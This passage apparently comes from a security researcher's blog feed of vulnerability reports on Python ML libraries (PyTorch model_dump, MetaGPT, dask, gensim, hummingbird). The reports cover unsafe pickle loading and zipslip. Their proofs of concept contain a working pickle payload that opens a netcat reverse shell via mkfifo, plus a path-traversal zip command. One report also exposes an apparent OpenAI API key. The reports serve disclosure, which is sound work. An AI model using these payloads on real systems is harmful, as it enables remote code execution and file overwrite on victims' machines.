<p>Firstly, let’s create a malicous model, and compress it with zip format. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L230"><code class="language-plaintext highlighter-rouge">get_model_info#L230</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">version</code> file. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L238"><code class="language-plaintext highlighter-rouge">get_model_info#L238</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code> files. In line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L255"><code class="language-plaintext highlighter-rouge">get_model_info#L255</code></a> and line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L259"><code class="language-plaintext highlighter-rouge">get_model_info#L259</code></a>, we know that the model must contain a python file and a <code class="language-plaintext highlighter-rouge">debug_pkl</code> file. So, let’s create those files:</p>

<h3 id="version-1"><code class="language-plaintext highlighter-rouge">version</code></h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.1.0
</code></pre></div></div>

<h3 id="datapkl-and-constantspkl"><code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code></h3>

<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">data.pkl</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
student_names = [1]
with open('data.pkl', 'wb') as f:
    pickle.dump(student_names, f)
</code></pre></div></div>

<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">constants.pkl</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
student_names = ["df"]
with open('constants.pkl', 'wb') as f:
    pickle.dump(student_names, f)
</code></pre></div></div>

<h3 id="payloadpy"><code class="language-plaintext highlighter-rouge">payload.py</code></h3>

<p>Just create a empty file named <code class="language-plaintext highlighter-rouge">payload.py</code></p>

<h3 id="payloadpydebug_pkl"><code class="language-plaintext highlighter-rouge">payload.py.debug_pkl</code></h3>

<p>Use following snippets to create a malicous pickle payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
        return os.system, (cmd,)

with open('payload.py.debug_pkl', 'wb') as f:
    pickle.dump(RCE(), f)
</code></pre></div></div>

<h3 id="malicious-model-zip-file"><code class="language-plaintext highlighter-rouge">malicious model zip file</code></h3>

<p>Copy all the files to a folder and create a model zipfile:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la torch-model-dump
-rw-r--r-- 1 kali kali   20 Jun 24 17:45 constants.pkl
-rw-r--r-- 1 kali kali   17 Jun 24 17:45 data.pkl
-rw-r--r-- 1 kali kali    0 Jun 24 17:45 payload.py
-rw-r--r-- 1 kali kali  121 Jun 24 17:45 payload.py.debug_pkl
-rw-r--r-- 1 kali kali    6 Jun 24 17:39 version

&gt; zip -r torch-model-dump.zip torch-model-dump
</code></pre></div></div>

<p>The <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/torch-model-dump.zip"><code class="language-plaintext highlighter-rouge">torch-model-dump.zip</code></a> can be download from github.</p>

<h2 id="start-attack">Start attack</h2>

<p>Install latest pytorch:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install torch
</code></pre></div></div>

<p>Use following command to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m torch.utils.model_dump --style=json ./torch-model-dump.zip
</code></pre></div></div>

<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
</code></pre></div></div>
<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing">https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing</a></p>

<p><img src="/assets/images/bughunter/torch-pickle.png" alt="image" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims parse a malicious model file using <code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code>, command injection can be achieved.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264">get_model_info#L264</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt</title><link href="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html" rel="alternate" type="text/html" title="Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Zipslip when parsing invoice zip file via InvoiceOCRAssistant</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-23: Relative Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.8.1</p>
</blockquote>

<h2 id="description">Description</h2>

<p>In <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html"><code class="language-plaintext highlighter-rouge">receipt_assistant</code></a>, Metagpt supports OCR recognition of invoice files in pdf, png, jpg, and zip formats. And the class <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L31C7-L31C17"><code class="language-plaintext highlighter-rouge">InvoiceOCR</code></a> is responsible for recognizing the invoice files. When the files is compressed with zip format, <a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L63"><code class="language-plaintext highlighter-rouge">InvoiceOCR._unzip</code></a> is used to extract the files in zip file. However, the file name in zip file is not sanitized and appended to dest path directly, could cause zipslip attacks. It’s possible to overwrite files in victims’ mechine, causing code execution attacks.</p>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L78">InvoiceOCR._unzip#L78</a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
async def _unzip(file_path: Path) -&gt; Path:
    """Unzip a file and return the path to the unzipped directory.

    Args:
        file_path: The path to the zip file.

    Returns:
        The path to the unzipped directory.
    """
    file_directory = file_path.parent / "unzip_invoices" / datetime.now().strftime("%Y%m%d%H%M%S")
    with zipfile.ZipFile(file_path, "r") as zip_ref:
        for zip_info in zip_ref.infolist():
            # Use CP437 to encode the file name, and then use GBK decoding to prevent Chinese garbled code
            relative_name = Path(zip_info.filename.encode("cp437").decode("gbk"))
            if relative_name.suffix:
                # unsafe path appending
                full_filename = file_directory / relative_name
                await File.write(full_filename.parent, relative_name.name, zip_ref.read(zip_info.filename))

    logger.info(f"unzip_path: {file_directory}")
    return file_directory
</code></pre></div></div>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39"><code class="language-plaintext highlighter-rouge">File.write#L39</code></a> function is reponsible for writing the file content in zip file to target path. In Line 39, <code class="language-plaintext highlighter-rouge">full_path = root_path / filename</code>, the <code class="language-plaintext highlighter-rouge">filename</code> is not santized, filename such as <code class="language-plaintext highlighter-rouge">../../../../../../../../test.txt</code> in zip file will be appended to <code class="language-plaintext highlighter-rouge">root_path</code>, causing path traversal and file overwrite.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def write(cls, root_path: Path, filename: str, content: bytes) -&gt; Path:
    """Write the file content to the local specified path.

    Args:
        root_path: The root path of file, such as "/data".
        filename: The name of file, such as "test.txt".
        content: The binary content of file.

    Returns:
        The full filename of file, such as "/data/test.txt".

    Raises:
        Exception: If an unexpected error occurs during the file writing process.
    """
    root_path.mkdir(parents=True, exist_ok=True)
    full_path = root_path / filename
    async with aiofiles.open(full_path, mode="wb") as writer:
        await writer.write(content)
        logger.debug(f"Successfully write file: {full_path}")
        return full_path
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, let’s create a zip file containing relative file name, and save as <code class="language-plaintext highlighter-rouge">auth.zip</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip auth.zip ../../../../../../../home/kali/test.py
</code></pre></div></div>

<p>Then, install metagpt and it’s ocr extras:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade metagpt
pip install --upgrade 'metagpt[ocr]'
</code></pre></div></div>

<p>After installed, we need to init metagpt with our openai key according to <a href="https://github.com/geekan/MetaGPT?tab=readme-ov-file#configuration">official documentation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create 
&gt; metagpt --init-config

# fill your openai key, this key is for testing
&gt; sed -i 's/YOUR_API_KEY/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/g' /root/.metagpt/config2.yaml
</code></pre></div></div>

<p>Before attacks, let’s check the <code class="language-plaintext highlighter-rouge">/home/kali/test.py</code> is empty path</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
ls: cannot access '/home/kali/test.py': No such file or directory
</code></pre></div></div>

<h3 id="start-attack">Start attack</h3>

<p>Run following snippets from <a href="https://docs.deepwisdom.ai/main/en/guide/use_cases/agent/receipt_assistant.html#example-1">offical tutorial</a> to parse and recognize our <code class="language-plaintext highlighter-rouge">auth.zip</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from metagpt.roles.invoice_ocr_assistant import InvoiceOCRAssistant, InvoicePath
from metagpt.schema import Message

role = InvoiceOCRAssistant()
await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(file_path="auth.zip")))
</code></pre></div></div>

<p>Now let’s check the file is overwritten successfully:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /home/kali/test.py
-rw-r--r-- 1 root root 12 Jun 24 14:50 /home/kali/test.py
</code></pre></div></div>

<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing">https://colab.research.google.com/drive/1ujE5yqxcB_RlRtXMfNSSeTYPLy6DMDwQ?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53811891297_68e84388c8_h.jpg" alt="poc" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims parse and recognize an malicious zip file, zipslip can be achieved to overwrite files in victims mechine, causing potential code execution attack.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79">_unzip#L79</a></p>

<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Command injection via unsafe pickle.loads in dask.array.from_npy_stack</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>2024.6.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The dask api <a href="https://docs.dask.org/en/stable/generated/dask.array.from_npy_stack.html#dask.array.from_npy_stack"><code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack</code></a> is used to load dask array from stack of npy files. It loads dask arrays from a directory which contains a <code class="language-plaintext highlighter-rouge">info</code> file. The <code class="language-plaintext highlighter-rouge">info</code> file saves the information of the dask array. And <code class="language-plaintext highlighter-rouge">from_npy_stack</code> uses <code class="language-plaintext highlighter-rouge">pickle.load</code> method to load the <code class="language-plaintext highlighter-rouge">info</code> file which is a pickle file. If a victim loads a malicious <code class="language-plaintext highlighter-rouge">info</code> pickle file, command injection can be achieved.</p>

<p>The vulnerable function: <a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708"><code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack#L5708</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def from_npy_stack(dirname, mmap_mode="r"):
    """Load dask array from stack of npy files

    Parameters
    ----------
    dirname: string
        Directory of .npy files
    mmap_mode: (None or 'r')
        Read data in memory map mode

    See Also
    --------
    to_npy_stack
    """
    with open(os.path.join(dirname, "info"), "rb") as f:
        # vulnerable to command injection !!!!
        info = pickle.load(f)

    dtype = info["dtype"]
    chunks = info["chunks"]
    axis = info["axis"]

    name = "from-npy-stack-%s" % dirname
    keys = list(product([name], *[range(len(c)) for c in chunks]))
    values = [
        (np.load, os.path.join(dirname, "%d.npy" % i), mmap_mode)
        for i in range(len(chunks[axis]))
    ]
    dsk = dict(zip(keys, values))

    return Array(dsk, name, chunks, dtype)
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, create a malicious pickle file. Use following snippets to create a malicous <code class="language-plaintext highlighter-rouge">info</code> pickle file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
        return os.system, (cmd,)

with open('info', 'wb') as f:
    pickle.dump(RCE(), f)
</code></pre></div></div>

<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">info</code></a> to github for testing.</p>

<h2 id="start-attack">Start attack</h2>

<p>Install latest dask:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install dask
</code></pre></div></div>

<p>Create a malicious dask array directory.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>example
    |__info
</code></pre></div></div>

<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import dask.array as da
da.from_npy_stack('example')
</code></pre></div></div>

<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
</code></pre></div></div>
<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing">https://colab.research.google.com/drive/1XaF82Sgt1nmY0hhSu0l_PBnFTQuCyNLq?usp=sharing</a></p>

<p><img src="http://live.staticflickr.com/65535/53822138335_9a3095507b_k.jpg" alt="image" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims load a malicious dask array folder using <code class="language-plaintext highlighter-rouge">dask.array.from_npy_stack</code>, command injection can be achieved on victims’ mechine.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708">dask.array.from_npy_stack#L5708</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Command injection via unsafe pickle.loads in LdaModel.load</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>4.3.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The gensim api <a href="https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel.load"><code class="language-plaintext highlighter-rouge">gensim.models.ldamodel.LdaModel.load</code></a> is used to Load a LdaModel from file, and the LdaModel is stored in pickle file. In <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692"><code class="language-plaintext highlighter-rouge">LdaModel.load#L1692</code></a>, it uses <code class="language-plaintext highlighter-rouge">utils.unpickle</code> to deserilize the model file. And in <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460"><code class="language-plaintext highlighter-rouge">utils.unpickle</code></a>, it uses <code class="language-plaintext highlighter-rouge">pickle.load</code> to load the pickle model which will causing code injection when loading a malicious pickle file.</p>

<p>The vulnerable function: <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692"><code class="language-plaintext highlighter-rouge">LdaModel.load#L1692</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@classmethod
    def load(cls, fname, *args, **kwargs):
    ...
    id2word_fname = utils.smart_extension(fname, '.id2word')
    ...
    if os.path.isfile(id2word_fname):
        try:
            # vulnerable to code injection !!!
            result.id2word = utils.unpickle(id2word_fname)
        except Exception as e:
            logging.warning("failed to load id2word dictionary from %s: %s", id2word_fname, e)
    return result
</code></pre></div></div>

<p>The <a href="https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460"><code class="language-plaintext highlighter-rouge">utils.unpickle#L1460</code></a> funtion:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def unpickle(fname):
    """Load object from `fname`, using smart_open so that `fname` can be on S3, HDFS, compressed etc.

    Parameters
    ----------
    fname : str
        Path to pickle file.

    Returns
    -------
    object
        Python object loaded from `fname`.

    """
    with open(fname, 'rb') as f:
        # vulnerable to code injection !!!
        return _pickle.load(f, encoding='latin1')  # needed because loading from S3 doesn't support readline()
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, create a malicious pickle file. Use following snippets to create a malicous <code class="language-plaintext highlighter-rouge">payload.pickle</code> file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
        return os.system, (cmd,)

with open('payload.pickle', 'wb') as f:
    pickle.dump(RCE(), f)
</code></pre></div></div>

<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></a> to github for testing.</p>

<h2 id="start-attack">Start attack</h2>

<p>Install latest gensim:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install gensim
</code></pre></div></div>

<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from gensim.models.ldamodel import LdaModel
lda = LdaModel.load("payload.pickle")
</code></pre></div></div>

<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
</code></pre></div></div>
<h2 id="colab">Colab</h2>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing">https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing</a></p>

<p><img src="http://live.staticflickr.com/65535/53821790176_089365c3f3_k.jpg" alt="image" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims load a malicious pickle model using <code class="language-plaintext highlighter-rouge">LdaModel.load</code>, command injection can be achieved on victims’ mechine.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692">LdaModel.load#L1692</a></p>

<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460">utils.unpickle#L1460</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Command injection via unsafe pickle.loads using api hummingbird.ml.load</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-94: Code Injection</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.4.11</p>
</blockquote>

<h2 id="description">Description</h2>

<p>Hummingbird can be used to convert trained traditional ML models into <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#introduction">PyTorch, TorchScript, ONNX, and TVM</a>. In Hummingbird <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples">official example</a>, it trains a scikit-learn RandomForestClassifier model, save the model to a zip file, and finally load the model back from the zip file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import numpy as np
from sklearn.ensemble import RandomForestClassifier
from hummingbird.ml import convert, load

# Create some random data for binary classification
num_classes = 2
X = np.random.rand(100000, 28)
y = np.random.randint(num_classes, size=100000)

# Create and train a model (scikit-learn RandomForestClassifier in this case)
skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
skl_model.fit(X, y)

# Use Hummingbird to convert the model to PyTorch
model = convert(skl_model, 'pytorch')

# Run predictions on CPU
model.predict(X)

# Run predictions on GPU
model.to('cuda')
model.predict(X)

# Save the model
model.save('hb_model')

# Load the model back
model = load('hb_model')
</code></pre></div></div>

<p>After running the example snippets, it creates a <code class="language-plaintext highlighter-rouge">hb_model.zip</code> file containing all PyTorch model information. The structure of zipped model file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hb_model.zip
    |___deploy_model.zip (pickle format)
    |___model_configuration.txt
    |___model_type.txt
</code></pre></div></div>

<p>When loading the model back, it uses <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L108"><code class="language-plaintext highlighter-rouge">PyTorchSklearnContainer.load</code></a> to extract the zip file, and use <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177"><code class="language-plaintext highlighter-rouge">pickle.load</code></a> to load the <code class="language-plaintext highlighter-rouge">deploy_model.zip</code> which is a pickle file.</p>

<p>The vulnerable function: <a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177"><code class="language-plaintext highlighter-rouge">PyTorchSklearnContainer.load#L177</code></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
def load(location, do_unzip_and_model_type_check=True, delete_unzip_location_folder: bool = True,
            digest=None, override_flag=False):
    ...
    # Unzip the dir.
    if do_unzip_and_model_type_check:
        zip_location = location
        if not location.endswith("zip"):
            zip_location = location + ".zip"
        else:
            location = zip_location[:-4]
        assert os.path.exists(zip_location), "Zip file {} does not exist.".format(zip_location)
    ...

    if model_type == "torch.jit":
        # This is a torch.jit model
        model = torch.jit.load(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH))
        with open(os.path.join(location, "container.pkl"), "rb") as file:
            # vulnerable to command injection !!!
            container = pickle.load(file)
        container._model = model
    elif model_type == "torch":
        # This is a pytorch  model
        with open(os.path.join(location, constants.SAVE_LOAD_TORCH_JIT_PATH), "rb") as file:
            # vulnerable to command injection !!!
            container = pickle.load(file)
    ...
    return container
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>Firstly, install latest hummingbird</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install hummingbird-ml
</code></pre></div></div>

<p>And create a valid pytorch model file following <a href="https://github.com/microsoft/hummingbird?tab=readme-ov-file#examples">official example</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import numpy as np
from sklearn.ensemble import RandomForestClassifier
from hummingbird.ml import convert, load

# Create some random data for binary classification
num_classes = 2
X = np.random.rand(100000, 28)
y = np.random.randint(num_classes, size=100000)

# Create and train a model (scikit-learn RandomForestClassifier in this case)
skl_model = RandomForestClassifier(n_estimators=10, max_depth=10)
skl_model.fit(X, y)

# Use Hummingbird to convert the model to PyTorch
model = convert(skl_model, 'pytorch')

# Run predictions on CPU
model.predict(X)

# Run predictions on GPU
model.to('cuda')
model.predict(X)

# Save the model
model.save('hb_model')
</code></pre></div></div>

<p>Now we have a valid pytorch model file in zip format:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hb_model.zip
    |___deploy_model.zip (pickle format)
    |___model_configuration.txt
    |___model_type.txt
</code></pre></div></div>

<p>Create a malicious pickle file named <code class="language-plaintext highlighter-rouge">deploy_model.zip</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
        return os.system, (cmd,)

with open('deploy_model.zip', 'wb') as f:
    pickle.dump(RCE(), f)
</code></pre></div></div>

<p>Use following command to replace and update the <code class="language-plaintext highlighter-rouge">deploy_model.zip</code> file in <code class="language-plaintext highlighter-rouge">hb_model.zip</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip -u hb_model.zip deploy_model.zip
</code></pre></div></div>

